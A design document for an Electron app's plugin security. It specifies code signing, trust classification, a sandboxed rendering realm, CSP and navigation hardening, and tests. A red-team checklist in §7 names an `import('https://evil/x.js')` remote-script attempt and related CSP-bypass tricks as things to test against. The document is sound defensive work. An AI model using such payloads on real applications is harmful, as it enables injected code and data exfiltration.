# 05 — Tier-B Sandbox + Code Signing (DEV-61, DEV-62)

> **Subsystem owner:** the security phases. Implements RFC §4 (trust model, isolation), §4.10 (signing), §6 (backend gate), §8.1–8.2 (verify at install + load).
> **Trust model today:** curation-only. Everything that ships loads **Tier A in-process** (the `plugins.js` loader `import()`s `alpine-plugin://<id>/index.js` in the topbar renderer, which has full `preload.js` / `window.shell`). This document designs the machinery that lets us *safely* admit non-first-party code — and is explicit about which parts must stay **gated** behind a dedicated security review before untrusted install is switched on.
>
> **Read alongside:** `01-manifest-and-registry.md` (manifest shape, `PluginRecord`, grants), `03-capability-broker.md` (`pluginHost.js` / `pluginBridge.js` route table), `04-backend-supervisor.md` (`pluginSupervisor.js`). Where those docs are not yet written, the contracts this doc depends on are restated in §0.

---

## 0. Shared contracts this subsystem defines or depends on

Other subsystems must import these names, not re-declare them. **Single source of truth** for the security constants is `@alpine/plugin-sdk` (dual-built CJS+ESM); the main-process files here `require()` that build. The signing/trust constants that are *security-only* (not author-facing) live in `electron/pluginSignature.js` and `electron/pluginTrust.js`.

### 0.1 Trust levels — the enum every other file keys off

```js
// electron/pluginTrust.js  (CJS, no external deps)
const TRUST = Object.freeze({
  FIRST_PARTY: 'first-party', // shipped in resources/plugins, or signed by us
  SIGNED:      'signed',      // valid Ed25519 sig vs MARKETPLACE_PUBLIC_KEY
  DEV_LINK:    'dev-link',    // present in .dev-links.json, dev build only
  UNVERIFIED:  'unverified',  // sideloaded, no/invalid signature
})
// Realm each trust level is allowed to run in:
const REALM = Object.freeze({ TIER_A: 'tier-a', TIER_B: 'tier-b', REFUSE: 'refuse' })
```

### 0.2 The trust gate (the single most load-bearing rule)

```
resolveRealm(record) →
  DEV_LINK      → TIER_A          (only when !app.isPackaged; author is trust root of own machine)
  FIRST_PARTY   → TIER_A
  SIGNED        → TIER_A
  UNVERIFIED    → TIER_B          (only if UNTRUSTED_INSTALL_ENABLED, else REFUSE)
  <backend/`node` requested> and trust ∉ {FIRST_PARTY, SIGNED} → strip `main`, never fork
```

`UNTRUSTED_INSTALL_ENABLED` is a **build-time constant defaulting to `false`** (see §5). Tier B code (the sandbox) can be built, merged, and unit-tested with the flag off; flipping it on is the act that requires the dedicated security review. Until then `UNVERIFIED → REFUSE` and the shipped product is curation-only exactly as today.

### 0.3 Signing verify function signatures (`electron/pluginSignature.js`)

```js
// Bundled marketplace public key (raw 32-byte Ed25519, base64). Baked into the app,
// same "constant + pure verify" pattern packages/license uses. Rotating = app update.
const MARKETPLACE_PUBLIC_KEY /* : string (base64, 32 bytes) */

// Canonical bytes that get signed: sha256 over a deterministic manifest+files digest (§4.2).
function packageDigest(pluginDir: string): Buffer        // sha256 of the canonical file tree
function verifyDetached(digest: Buffer, sigB64: string): boolean   // pure Ed25519 verify vs bundled key
function verifyPluginDir(pluginDir: string): {
  trust: 'signed' | 'unverified',
  reason: string | null,        // why unverified (missing SIGNATURE, bad sig, digest mismatch…)
  digestHex: string,
}
function verifyArchive(archivePath: string, sigB64: string): boolean  // install-time, over the .alpineplugin bytes
```

`verifyPluginDir` is called at **install** and at **every load** (RFC §4.10). It never throws — a failure returns `{ trust: 'unverified', reason }`.

### 0.4 The declarative topbar widget-state channel (host renders untrusted widgets)

A Tier-B `WebContentsView` cannot composite into the transparent 24px bar, so an untrusted topbar widget does **not** render its own React into the bar. Instead the sandboxed frame pushes a tiny **declarative descriptor** over a state channel and the *trusted host* renders it. Contract (also exported as a TS type from the SDK for authors):

```ts
// TopbarWidgetState — the ONLY thing an untrusted topbar widget can put in the bar
interface TopbarWidgetState {
  icon?: string          // 'lucide:CloudSun' (curated subset) — NOT arbitrary markup
  text?: string          // <= 24 chars, plain text, truncated host-side
  badge?: number | string// small count/dot
  tooltip?: string
  onClickOpensPanel?: boolean  // click → host opens the plugin's sandboxed panel view
}
```

IPC surface for this channel (all sender-scoped, see §3.4):
| Channel | Dir | Payload |
|---|---|---|
| `plugin-widget/set-state` | sandbox→main | `TopbarWidgetState` (validated, clamped) |
| `plugin-widget/state-changed` | main→trusted topbar | `{ pluginId, state }` (target-send to owning display's topbar) |
| `plugin-widget/click` | trusted topbar→main | `{ pluginId }` → host opens panel view |

### 0.5 Session partition + CSP constants

- Partition name: `` `persist:plugin-${id}` `` — one per plugin, created lazily, **deleted on uninstall**.
- CSP string builder: `buildPluginCsp(networkConnect: string[]): string` exported from `electron/pluginSession.js` (§3.2). Deterministic from `manifest.network.connect`.

---

## 1. What is safely implementable now vs. what must stay gated

This is stated up front so the reviewer can trust the honesty of the rest.

| Piece | Status | Why |
|---|---|---|
| `pluginSignature.js` (Ed25519 verify, bundled key, verify at install + load) | **Ship now** | Pure crypto over `node:crypto`; no attack surface it *adds*, only gates. Wiring "unverified ⇒ capped/refused" is safe. |
| `pluginTrust.js` (`resolveRealm`, trust classification) | **Ship now** | Pure classification; with `UNTRUSTED_INSTALL_ENABLED=false` it only ever *refuses*, never newly-admits. |
| `pluginSession.js` (partition, CSP via `onHeadersReceived`, permission handlers deny, nav lockdown) | **Ship now, build & unit-test** | Hardening primitives; harmless with no untrusted plugin actually loaded. Also reused to harden existing windows (RFC §4.11). |
| `pluginPreload.js` + `pluginView.js` (WebContentsView, `sandbox:true`, `window.alpinePlugin` only) | **Ship the code now** | The realm itself is correct and testable with a *first-party* fixture plugin. |
| Declarative topbar widget-state bridge (§0.4) | **Ship now** | Host-rendered; no untrusted pixels in the bar. |
| **Actually setting `UNTRUSTED_INSTALL_ENABLED=true`** (letting an unsigned sideloaded plugin *execute*, even in Tier B) | **GATED — needs dedicated security review** | See §7. The broker adapter audit (RFC §4.5), the CSP-vs-exfil review, the `will-navigate`/redirect review, and a red-team pass are prerequisites. Nothing in this PR flips it. |
| Backend (`main`/`node`) for anything not `FIRST_PARTY`/`SIGNED` | **GATED — permanently for unsigned; review for signed** | `utilityProcess` is fault- not malice-isolation (RFC §6.3). Sockets are uncovered; signing-gated only. |

**Net effect of merging this subsystem with the flag off:** identical shipped behavior to today (curation-only, Tier A) **plus** every plugin now carries a verified trust label, first-party/preset plugins are provably first-party, and the entire Tier-B machine exists and is exercised by a first-party fixture in CI — so flipping the flag later is a config change guarded by a review, not a from-scratch build.

---

## 2. File-by-file: new files

```
apps/desktop/electron/
  pluginTrust.js        NEW  trust classification + resolveRealm (the gate)
  pluginSignature.js    NEW  Ed25519 verify (install + load), bundled key
  pluginSession.js      NEW  per-plugin session: partition, CSP, permission deny, nav lockdown
  pluginPreload.js      NEW  sandbox preload — exposes ONLY window.alpinePlugin
  pluginView.js         NEW  WebContentsView/child-window factory for Tier B surfaces
  pluginWidgetBridge.js NEW  declarative topbar widget-state channel (host renders)
```

Existing files edited: `main.js`, `preload.js`, `modules/plugins.js`, `src/plugins/loadPlugins.ts`, `src/components/topbar/pluginSlot.tsx`, `src/components/settings/pluginsPage.tsx`. See §6.

---

## 3. Tier-B sandbox

### 3.1 `pluginView.js` — the isolated realm factory

Creates the out-of-realm `webContents` that runs untrusted UI. **Never loads `preload.js`.**

```js
// electron/pluginView.js
const { WebContentsView, BrowserWindow } = require('electron')
const path = require('path')
const { getPluginSession } = require('./pluginSession')

const PLUGIN_PRELOAD = path.join(__dirname, 'pluginPreload.js')

// surfaceKind: 'topbar-panel' | 'desktop' | 'settings'
function createPluginSurface({ pluginId, entryUrl, surfaceKind, record, network }) {
  const session = getPluginSession(pluginId, network)   // per-plugin partition + CSP + deny handlers (§3.2)

  const webPreferences = {
    preload: PLUGIN_PRELOAD,     // ← window.alpinePlugin ONLY, no window.shell
    sandbox: true,               // explicit (RFC §4.4)
    contextIsolation: true,
    nodeIntegration: false,
    webSecurity: true,
    session,
    additionalArguments: [`--alpine-plugin-id=${pluginId}`], // read in preload for identity display only
    // NOTE: identity used for grants is derived server-side from webContents.id, never from here.
  }

  let view, host
  if (surfaceKind === 'settings') {
    // rich interactive React is allowed only in a child window (own webContents, no host globals)
    host = new BrowserWindow({ show: false, parent: getSettingsWindow(), modal: false,
      webPreferences, frame: true, backgroundColor: '#0a0a0a' })
    view = host.webContents
  } else {
    // topbar-panel / desktop: embedded rectangle positioned by main
    const wcv = new WebContentsView({ webPreferences })
    view = wcv.webContents
    host = wcv
  }

  hardenNavigation(view, pluginId)   // §3.3
  view.loadURL(entryUrl)             // alpine-plugin://<id>/dist/renderer.js host page
  registerSurface(pluginId, view.id, { host, surfaceKind })  // §3.4 grants map
  return { host, webContentsId: view.id }
}
```

**Compositing reality (RFC §4.3, Risk #2):** a `WebContentsView` paints an opaque rectangle and cannot live inside the transparent 24px bar with a working dropdown. Therefore:
- **Topbar:** untrusted widgets never get a view *in the bar*. They push `TopbarWidgetState` (§0.4); the host renders the icon/text/badge in the trusted topbar. A click opens a **panel** — a `topbar-panel` `WebContentsView` positioned by main just under the bar (like a dropdown surface), which *is* the plugin's own sandboxed frame and may render arbitrary React.
- **Desktop widgets:** self-contained rectangles — a `WebContentsView` sized/positioned per the desktop layout store. Fine, they are already opaque rectangles.
- **Settings pages:** a child `BrowserWindow` (own `webContents`). Full interactive React, no host globals.

### 3.2 `pluginSession.js` — partition, CSP, permission denial

```js
// electron/pluginSession.js
const { session } = require('electron')

const sessions = new Map() // pluginId -> Electron Session

function buildPluginCsp(networkConnect) {
  const connect = (networkConnect && networkConnect.length)
    ? networkConnect.join(' ')
    : "'none'"
  return [
    "default-src 'none'",
    "script-src 'self' alpine-plugin:",
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' alpine-plugin: data:",
    `connect-src ${connect}`,
    "frame-src 'none'",
    "base-uri 'none'",
    "form-action 'none'",
  ].join('; ')
}

function getPluginSession(pluginId, networkConnect) {
  if (sessions.has(pluginId)) return sessions.get(pluginId)
  const ses = session.fromPartition(`persist:plugin-${pluginId}`)

  // CSP bound at the network layer (scheme is registered WITHOUT bypassCSP, so this holds).
  ses.webRequest.onHeadersReceived((details, cb) => {
    cb({ responseHeaders: {
      ...details.responseHeaders,
      'Content-Security-Policy': [buildPluginCsp(networkConnect)],
      'X-Content-Type-Options': ['nosniff'],
    }})
  })

  // Every web permission denied by default (RFC §4.4).
  ses.setPermissionRequestHandler((_wc, _perm, cb) => cb(false))
  ses.setPermissionCheckHandler(() => false)
  ses.setDevicePermissionHandler(() => false)
  // Block any protocol the plugin frame tries to reach other than its own + declared https.
  ses.protocol // (registration of alpine-plugin handler on this session done in main once)

  sessions.set(pluginId, ses)
  return ses
}

async function destroyPluginSession(pluginId) {
  const ses = sessions.get(pluginId)
  if (!ses) return
  try { await ses.clearStorageData() } catch {}
  try { await ses.clearCache() } catch {}
  sessions.delete(pluginId)
}

module.exports = { getPluginSession, destroyPluginSession, buildPluginCsp }
```

`destroyPluginSession` is called from the `plugins/uninstall` path (RFC §8.4) so a plugin's storage never survives its removal and a re-install with the same id starts clean.

### 3.3 Navigation lockdown

Applied to every plugin `webContents` (and, per RFC §4.11, retrofitted to the existing windows in a sibling PR):

```js
function hardenNavigation(wc, pluginId) {
  wc.setWindowOpenHandler(() => ({ action: 'deny' }))
  wc.on('will-navigate', (e, url) => {
    // lock the frame to its own origin; no drive-by to http(s) top-level nav
    if (!url.startsWith(`alpine-plugin://${pluginId}/`)) e.preventDefault()
  })
  wc.on('will-attach-webview', (e) => e.preventDefault())
  wc.on('will-redirect', (e, url) => {
    if (!url.startsWith(`alpine-plugin://${pluginId}/`)) e.preventDefault()
  })
}
```

Note `connect-src` (CSP) governs `fetch`/XHR to declared https hosts; `will-navigate`/`will-redirect` govern *top-level frame* navigation and are locked to the plugin's own scheme. Both are needed.

### 3.4 `pluginPreload.js` — `window.alpinePlugin` only

The whole point: this preload exposes a **capability-scoped** bridge and nothing that reaches `window.shell`. Identity is server-side; the renderer sends no id.

```js
// electron/pluginPreload.js
const { contextBridge, ipcRenderer } = require('electron')

// invoke → single validated channel plugins/invoke; grant resolved main-side from event.sender.id
function invoke(action, payload) {
  return ipcRenderer.invoke('plugins/invoke', { action, payload })
}

// id-less event subscription: main target-sends 'plugin/<action>' ONLY to this webContents
function on(action, cb) {
  const ch = `plugin/${action}`
  const h = (_e, data) => cb(data)
  ipcRenderer.on(ch, h)
  return () => ipcRenderer.removeListener(ch, h)
}

contextBridge.exposeInMainWorld('alpinePlugin', {
  invoke,                                   // capability broker (storage, net:fetch, read:*, control:* …)
  on,
  // declarative topbar widget (host renders it — §0.4)
  setWidgetState: (state) => ipcRenderer.send('plugin-widget/set-state', state),
  onPanelOpen: (cb) => { const h = () => cb(); ipcRenderer.on('plugin/panel-open', h); return () => ipcRenderer.removeListener('plugin/panel-open', h) },
  // theme delivered as state (React context does not cross the boundary — RFC §5.2)
  theme: () => ipcRenderer.invoke('plugins/theme-get'),
  onThemeChanged: (cb) => { const h = (_e, t) => cb(t); ipcRenderer.on('plugin/theme-changed', h); return () => ipcRenderer.removeListener('plugin/theme-changed', h) },
})
```

**No raw `ipcRenderer` is exposed.** The SDK (`@alpine/plugin-sdk`) reads `window.alpinePlugin` in Tier B exactly as it reads `window.alpine` in Tier A — author code is identical (RFC §5.2). `plugins/invoke` and its grant/route model are owned by `03-capability-broker.md`; this subsystem only guarantees the *realm* and the *server-side identity*.

**Server-side identity (RFC §4.8):** a `grantsByWebContents: Map<number, { pluginId, permissions:Set, displayId }>` is populated in `registerSurface` at surface creation. `plugins/invoke`, `plugin-widget/set-state`, and storage handlers derive `pluginId` from `event.sender.id` and **ignore anything the renderer sends**. Events are **target-sent** to the owning `webContents` (never `broadcast()` — that hits all windows and leaks cross-plugin).

### 3.5 `pluginWidgetBridge.js` — host renders the declarative topbar widget

```js
// electron/pluginWidgetBridge.js
const { ipcMain } = require('electron')
const { getSurface, getGrant } = require('./pluginView')

const MAX_TEXT = 24
function sanitizeState(s) {
  if (!s || typeof s !== 'object') return null
  const out = {}
  if (typeof s.icon === 'string' && /^(lucide:[A-Za-z]+|assets\/[\w.\-/]+)$/.test(s.icon)) out.icon = s.icon
  if (typeof s.text === 'string') out.text = s.text.slice(0, MAX_TEXT)
  if (typeof s.badge === 'number' || typeof s.badge === 'string') out.badge = String(s.badge).slice(0, 6)
  if (typeof s.tooltip === 'string') out.tooltip = s.tooltip.slice(0, 120)
  out.onClickOpensPanel = !!s.onClickOpensPanel
  return out
}

function start() {
  ipcMain.on('plugin-widget/set-state', (event, raw) => {
    const grant = getGrant(event.sender.id)          // server-side id
    if (!grant) return
    const state = sanitizeState(raw)
    if (!state) return
    // target-send to the trusted topbar for the plugin's display only
    sendToTopbar(grant.displayId, 'plugin-widget/state-changed', { pluginId: grant.pluginId, state })
  })

  ipcMain.on('plugin-widget/click', (event, { pluginId }) => {
    // only the trusted topbar window may raise this; verify sender is a first-party topbar
    if (!isTrustedTopbar(event.sender)) return
    openPluginPanel(pluginId)   // creates/positions the topbar-panel WebContentsView (§3.1)
  })
}

module.exports = { handlers: {}, start }   // same { handlers, start } shape as modules/*.js
```

The trusted topbar renderer subscribes via `window.plugins.onWidgetState((pluginId, state) => …)` (added to `preload.js`, §6) and renders the icon/text/badge from the curated Lucide subset with the host `ThemeProvider`. **No untrusted pixels ever paint in the bar.**

---

## 4. Code signing (`pluginSignature.js`)

### 4.1 Key material

- **Signing** (offline, publisher side, `scripts/publishPlugin.js`): Ed25519 private key held only in CI secrets. Never in the repo.
- **Verifying** (every client): the 32-byte Ed25519 **public** key baked in as `MARKETPLACE_PUBLIC_KEY` (base64). Rotating the key = shipping an app update, matching how `packages/license` bakes its constant.

### 4.2 Canonical digest — what gets signed

The signature must cover **the manifest and every shipped code/asset file**, deterministically, so reordering or adding a file invalidates it.

```js
// packageDigest(pluginDir): sha256 over a canonical listing
// 1. Walk pluginDir; EXCLUDE the signature file itself ('SIGNATURE') and README/LICENSE (host-ignored).
// 2. For each remaining file, relative POSIX path + '\0' + sha256(file bytes) + '\n'.
// 3. Sort lines by path (stable, locale-independent). Join. sha256 the result → 32-byte digest.
// realpath-confine the walk (reject symlinks/junctions) — same guard as resolvePluginFile.
```

The detached `SIGNATURE` file (base64 Ed25519 signature over that 32-byte digest) sits at the plugin root (RFC §3.1). At **install** we also verify over the raw `.alpineplugin` bytes (`verifyArchive`) before extraction, so tamper is caught pre-disk.

### 4.3 The verify functions (concrete node crypto)

```js
// electron/pluginSignature.js  — CJS, node:crypto only, no external deps
const crypto = require('crypto')
const fs = require('fs')
const path = require('path')

// 32-byte raw Ed25519 public key, base64. Placeholder until the marketplace key is minted.
const MARKETPLACE_PUBLIC_KEY = process.env.ALPINE_MARKETPLACE_PUBKEY || '' // baked constant in real builds
const SIGNATURE_FILE = 'SIGNATURE'
const IGNORED = new Set(['SIGNATURE', 'README.md', 'LICENSE'])

function toKeyObject(rawB64) {
  if (!rawB64) return null
  // wrap raw 32 bytes as SPKI so crypto.verify accepts it
  const raw = Buffer.from(rawB64, 'base64')
  if (raw.length !== 32) return null
  const spkiPrefix = Buffer.from('302a300506032b6570032100', 'hex') // Ed25519 SPKI header
  const der = Buffer.concat([spkiPrefix, raw])
  try { return crypto.createPublicKey({ key: der, format: 'der', type: 'spki' }) }
  catch { return null }
}
const PUBKEY = toKeyObject(MARKETPLACE_PUBLIC_KEY)

function sha256(buf) { return crypto.createHash('sha256').update(buf).digest() }

function walkFiles(dir, base, acc) {
  for (const ent of fs.readdirSync(dir, { withFileTypes: true })) {
    if (ent.isSymbolicLink()) continue            // never follow — containment
    const abs = path.join(dir, ent.name)
    const rel = path.posix.join(base, ent.name)
    if (ent.isDirectory()) walkFiles(abs, rel, acc)
    else if (ent.isFile() && !IGNORED.has(rel)) acc.push({ rel, abs })
  }
  return acc
}

function packageDigest(pluginDir) {
  const files = walkFiles(pluginDir, '', [])
  const lines = files
    .map((f) => `${f.rel}\0${sha256(fs.readFileSync(f.abs)).toString('hex')}`)
    .sort()
  return sha256(Buffer.from(lines.join('\n'), 'utf8'))
}

// Pure verify — the packages/license pattern. Ed25519 needs no digest algo argument.
function verifyDetached(digest, sigB64) {
  if (!PUBKEY || !sigB64) return false
  let sig
  try { sig = Buffer.from(sigB64, 'base64') } catch { return false }
  if (sig.length !== 64) return false
  try { return crypto.verify(null, digest, PUBKEY, sig) } catch { return false }
}

function verifyPluginDir(pluginDir) {
  let sigB64 = null
  try { sigB64 = fs.readFileSync(path.join(pluginDir, SIGNATURE_FILE), 'utf8').trim() } catch {}
  if (!sigB64) return { trust: 'unverified', reason: 'no-signature', digestHex: '' }
  let digest
  try { digest = packageDigest(pluginDir) } catch (e) { return { trust: 'unverified', reason: 'digest-error:' + e.message, digestHex: '' } }
  const ok = verifyDetached(digest, sigB64)
  return ok
    ? { trust: 'signed', reason: null, digestHex: digest.toString('hex') }
    : { trust: 'unverified', reason: 'bad-signature', digestHex: digest.toString('hex') }
}

function verifyArchive(archivePath, sigB64) {
  try { return verifyDetached(sha256(fs.readFileSync(archivePath)), sigB64) } catch { return false }
}

module.exports = { MARKETPLACE_PUBLIC_KEY, packageDigest, verifyDetached, verifyPluginDir, verifyArchive }
```

**Verify at every load** (RFC §4.10): `resolveRealm` (§5) calls `verifyPluginDir` each time the loader lists plugins, so a signed plugin that is tampered on disk after install drops to `unverified` and is capped/refused on the next reload — no trust-on-first-use.

---

## 5. The trust gate (`pluginTrust.js`) — where realm is decided

This is the enforcement point that guarantees the core invariant (RFC §4.2): **untrusted code never runs in a renderer that has `preload.js`.**

```js
// electron/pluginTrust.js
const { app } = require('electron')
const path = require('path')
const { verifyPluginDir } = require('./pluginSignature')

// BUILD-TIME GATE. Flipping to true is what the security review (§7) authorizes.
const UNTRUSTED_INSTALL_ENABLED = false

const TRUST = Object.freeze({ FIRST_PARTY:'first-party', SIGNED:'signed', DEV_LINK:'dev-link', UNVERIFIED:'unverified' })
const REALM = Object.freeze({ TIER_A:'tier-a', TIER_B:'tier-b', REFUSE:'refuse' })

// pluginDir + preset flag (from the loader) + dev-link set → classify
function classifyTrust(pluginDir, { isPreset, isDevLinked }) {
  if (isPreset) return { trust: TRUST.FIRST_PARTY, reason: 'preset' }        // shipped in resources/plugins
  if (isDevLinked && !app.isPackaged) return { trust: TRUST.DEV_LINK, reason: 'dev-link' }
  const v = verifyPluginDir(pluginDir)                                        // Ed25519 vs bundled key
  return v.trust === 'signed'
    ? { trust: TRUST.SIGNED, reason: null }
    : { trust: TRUST.UNVERIFIED, reason: v.reason }
}

function resolveRealm(trust) {
  if (trust === TRUST.DEV_LINK)    return app.isPackaged ? REALM.REFUSE : REALM.TIER_A
  if (trust === TRUST.FIRST_PARTY) return REALM.TIER_A
  if (trust === TRUST.SIGNED)      return REALM.TIER_A
  // UNVERIFIED
  return UNTRUSTED_INSTALL_ENABLED ? REALM.TIER_B : REALM.REFUSE
}

// backend (`main` / `node`) is signing-gated regardless of realm (RFC §6.2)
function backendAllowed(trust) {
  return trust === TRUST.FIRST_PARTY || trust === TRUST.SIGNED
}

// A plugin is never auto-enabled unless it earns Tier A; unverified defaults disabled.
function defaultEnabled(trust) {
  return resolveRealm(trust) === REALM.TIER_A
}

module.exports = { TRUST, REALM, UNTRUSTED_INSTALL_ENABLED, classifyTrust, resolveRealm, backendAllowed, defaultEnabled }
```

### 5.1 How the loader enforces it

Two enforcement points, in **two different processes/realms**, so neither alone is a single point of failure:

**(a) Main process — `modules/plugins.js#listPlugins`** attaches trust to every record and refuses to serve renderer entry for refused plugins:

```js
// modules/plugins.js  (edit — see §6)
const trust = require('../pluginTrust')
// in the map that builds PluginRecord[]:
const t = trust.classifyTrust(pluginDir, { isPreset: manifest.preset, isDevLinked: devLinks.has(manifest.id) })
const realm = trust.resolveRealm(t.trust)
return { ...manifest, trust: t.trust, trustReason: t.reason, realm, enabled: computeEnabled(manifest.id, t.trust) }
```

`resolvePluginFile` additionally hard-refuses to serve **backend** (`main`) bytes and **any bytes for a REFUSE plugin**:

```js
function resolvePluginFile(id, rel) {
  const rec = recordFor(id)
  if (!rec || rec.realm === 'refuse') return null                 // REFUSE ⇒ 404, never executes
  if (isBackendPath(rec, rel) && !trust.backendAllowed(rec.trust)) return null
  /* …existing realpath containment… */
}
```

**(b) Renderer loader — `src/plugins/loadPlugins.ts`** picks the realm per record and **never `import()`s a Tier-B/refused plugin into the in-process (Tier A) topbar realm**:

```ts
for (const p of list) {
  if (p.enabled === false || p.realm === 'refuse') continue
  if (p.realm === 'tier-a') {
    await import(/* @vite-ignore */ `alpine-plugin://${p.id}/${p.entry}?v=${version}`)  // TRUSTED ONLY
  } else {
    // Tier B: DO NOT import in-process. Ask main to spawn the sandboxed surface.
    await window.plugins.mountSandbox(p.id)   // → pluginView.createPluginSurface (§3.1)
  }
}
```

This is the concrete realization of RFC §4.2/§4.3: the in-process `import()` path is now *statically* reachable only for `realm === 'tier-a'`, i.e. first-party / signed / dev-link. Everything else either goes to the sandbox (flag on) or is dropped (flag off). Because both the main-process file-server and the renderer loader independently enforce the gate, a bug in one does not admit untrusted code into Tier A.

---

## 6. Edits to existing files

| File | Edit |
|---|---|
| `electron/main.js` | Register the `alpine-plugin` protocol handler **on each plugin session** too (currently only the default session serves it); the sandboxed frame's session must resolve `alpine-plugin://<id>/…`. Wire the new modules into `ipc.register(… , pluginWidgetBridge)`. In `createSettingsWindow`/topbar creation, add the same `hardenNavigation` + CSP (RFC §4.11 defense-in-depth) — separate PR, noted here for sequencing. |
| `electron/modules/plugins.js` | Import `pluginTrust`. `listPlugins` attaches `{ trust, trustReason, realm }` and computes `enabled` via `defaultEnabled` for first-run (unverified default-off). `resolvePluginFile` refuses REFUSE realm and backend bytes for non-signed (§5.1a). Add `plugins/mount-sandbox` handler → `pluginView.createPluginSurface`. Call `destroyPluginSession(id)` in the uninstall path. |
| `electron/preload.js` (`window.plugins`) | Add `mountSandbox: (id) => ipcRenderer.invoke('plugins/mount-sandbox', id)`, `onWidgetState: (cb) => …('plugin-widget/state-changed')`, `widgetClick: (id) => ipcRenderer.send('plugin-widget/click', { pluginId:id })`. These are **trusted-topbar** channels; they are on the god-preload deliberately (the trusted host renders untrusted widgets). |
| `src/plugins/loadPlugins.ts` | Realm-branch the load loop (§5.1b). Tier A → `import()`; Tier B → `mountSandbox`; refuse → skip. |
| `src/components/topbar/pluginSlot.tsx` | Render host-side declarative widgets from `onWidgetState` (icon/text/badge via curated Lucide + `ThemeProvider`), click → `widgetClick`. Tier-A widgets keep rendering their own React as today. |
| `src/components/settings/pluginsPage.tsx` | Show a trust badge per plugin: **First-party** / **Signed** / **Dev** / **Unverified (capped)**; disable the enable toggle for `realm==='refuse'` with the reason tooltip. Replace the blanket "run with full shell access" copy with per-tier language. |

`SAFE_ID` in `plugins.js` currently allows `[a-z0-9._-]`; keep it, but note the RFC's stricter reverse-DNS `PLUGIN_ID_PATTERN` (from the SDK) is what the manifest validator (`01-manifest-and-registry.md`) must enforce before a folder is trusted. The signature digest and session partition both key off this id, so id validation is a security dependency, not cosmetic.

---

## 7. What MUST stay gated (the honest part) — prerequisites before `UNTRUSTED_INSTALL_ENABLED = true`

Flipping the flag lets an unsigned, sideloaded plugin **execute** (in Tier B). Before that, a dedicated security review must sign off on:

1. **Capability-broker adapter audit (RFC §4.5).** Every `capabilityRoutes` entry must be a hand-audited adapter using `execFile`(argv)/native calls, never a shell string built from plugin input. Until `network.connectSafe` exists, `control:network` stays FORBIDDEN. This is owned by `03-capability-broker.md` but is a hard prerequisite for admitting untrusted callers.
2. **CSP-vs-exfil review.** Confirm the scheme is registered **without** `bypassCSP` (it is today), that `onHeadersReceived` actually binds on the plugin session, and that `connect-src` cannot be widened by the renderer. Red-team `import('https://evil/x.js')`, data-URI script, and `<base>` tricks.
3. **Navigation/redirect review.** `will-navigate`, `will-redirect`, `setWindowOpenHandler(deny)`, `will-attach-webview(deny)` all present and tested; verify an allow-listed origin cannot open-redirect to exfil (mirrors the backend `redirect:'manual'` fix, RFC §6.5).
4. **Session isolation review.** Confirm `persist:plugin-<id>` partitions do not share cookies/cache/storage and that uninstall fully clears them; confirm one plugin cannot address another's partition.
5. **Server-side identity review.** Confirm `grantsByWebContents` is populated only at surface creation, that every handler derives id from `event.sender.id`, and that no event uses `broadcast()` (cross-plugin leak).
6. **Backend stays signed-only, permanently for unsigned.** `utilityProcess` is fault-, not malice-isolation; sockets are uncovered (RFC §6.3). `backendAllowed` must never return true for `UNVERIFIED`.
7. **Electron 40 `utilityProcess`/`--permission` spike** (RFC Risk #1) — only relevant once signed backends ship, but the broker-only fallback must be the assumption.

Until all of the above are green, the shipped product remains **curation-only, Tier A** — identical to today — with the added benefit that trust is now *verified and labeled* rather than assumed.

---

## 8. Test plan (shippable with the flag off)

- **Unit — `pluginSignature`:** sign a fixture dir with a test keypair (`crypto.generateKeyPairSync('ed25519')`), assert `verifyPluginDir → signed`; mutate one byte of a file → `unverified/bad-signature`; add a file → `unverified`; remove `SIGNATURE` → `no-signature`; tamper `SIGNATURE` → `bad-signature`. Round-trip `packageDigest` determinism across file orderings.
- **Unit — `pluginTrust`:** every `(trust, app.isPackaged, flag)` combination maps to the expected realm; `backendAllowed` false for dev-link/unverified; `defaultEnabled` false for unverified.
- **Integration — sandbox with a first-party fixture:** `createPluginSurface` loads a fixture `renderer.js`; assert `window.shell === undefined` and `window.alpinePlugin` present in the frame; assert CSP header on the response; assert `window.open`/top-level nav are blocked; assert `setWidgetState` reaches the host and renders in the topbar; assert a foreign `pluginId` in a `set-state` payload is ignored (server-side id wins).
- **Regression — the gate:** with the flag off, a fixture unsigned plugin never appears in the Tier-A `import()` path (spy on `import`) and its `alpine-plugin://` bytes return 404.
- **CI parity:** assert `MARKETPLACE_PUBLIC_KEY` decodes to 32 bytes in release builds (fail the build on a placeholder).
